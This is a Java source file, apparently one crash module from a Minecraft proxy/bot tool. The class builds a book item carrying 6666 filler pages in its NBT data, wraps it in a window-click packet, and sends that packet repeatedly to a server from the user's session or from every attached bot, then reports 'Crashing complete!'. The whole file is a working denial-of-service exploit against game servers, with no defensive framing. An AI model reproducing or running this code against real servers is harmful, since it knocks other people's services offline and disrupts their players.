package pl.venixpll.system.crash.impl;

import lombok.SneakyThrows;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import pl.venixpll.mc.data.game.WindowAction;
import pl.venixpll.mc.data.item.ItemStack;
import pl.venixpll.mc.objects.Player;
import pl.venixpll.mc.packet.Packet;
import pl.venixpll.mc.packet.impl.client.play.ClientPlayerWindowActionPacket;
import pl.venixpll.system.crash.Crash;
import pl.venixpll.system.crash.CrashType;

import java.util.List;
import java.util.stream.Collectors;
import java.util.stream.IntStream;

public class CrashZen2 extends Crash {
    public CrashZen2() {
        super("zen2",CrashType.NBT);
    }

    private Packet packet;

    @SneakyThrows
    @Override
    public void init() {
        final NBTTagCompound compound = new NBTTagCompound();

        final List<NBTBase> list = IntStream.range(0, 6666)
                .mapToObj(ia -> new NBTTagString("H7oa1VIGiPwyrfs7guvDOVcp7HokapmV"))
                .collect(Collectors.toList());

        final NBTTagList pages = new NBTTagList();
        list.forEach(pages::appendTag);

        compound.setTag("pages",pages);
        compound.setTag("title",new NBTTagString("uP5YuwG6J6Cwbze52BCpoMa82hlsBIwP"));
        compound.setTag("author",new NBTTagString("Bm8SlCd1l0powXunKyHAp74XK5sKzMNr"));

        final ItemStack stack = new ItemStack(386, -1, 0, compound);

        this.packet = new ClientPlayerWindowActionPacket(0,(short)1,0, WindowAction.CLICK_ITEM,1,stack);

    }

    @Override
    public void execute(String message, Player sender) {

        if(packet == null){
            sender.sendChatMessage("&cFailed to initialize crash!");
            return;
        }

        try {
            final String[] args = message.split(" ");
            final int amount = Integer.parseInt(args[2]);
            if (sender.getBots().size() == 0) {
                IntStream.range(0,amount).forEach(i -> sender.getRemoteSession().sendPacket(packet));
                sender.sendChatMessage("&aCrashing complete! &8(&6USER&8)");
            } else {
                sender.getBots().forEach(b -> IntStream.range(0,amount).forEach(i -> b.getSession().sendPacket(packet)));
                sender.sendChatMessage("&aCrashing complete! &8(&6BOTS&8)");
            }
        }catch(final Throwable t){
            sender.sendChatMessage("&cError occured during crashing! &8(&6" + t.getClass().getSimpleName() + "&8)");
        }
    }
}
